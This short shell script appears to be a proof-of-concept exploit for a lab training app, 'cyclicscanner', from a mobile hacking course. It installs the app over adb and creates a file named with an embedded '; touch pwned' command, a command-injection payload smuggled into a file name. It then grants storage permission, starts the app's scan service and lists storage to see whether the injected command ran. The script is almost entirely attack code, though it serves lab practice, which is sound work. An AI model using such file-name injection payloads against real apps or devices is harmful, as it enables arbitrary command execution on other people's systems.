adb install com.mobilehackinglab.cyclicscanner.apk
adb shell 'touch /sdcard/Download/\;\ touch\ pwned'
adb shell 'appops set com.mobilehackinglab.cyclicscanner MANAGE_EXTERNAL_STORAGE allow'
adb shell 'am start-foreground-service com.mobilehackinglab.cyclicscanner/.scanner.ScanService'
sleep 8
adb shell 'ls /sdcard/'

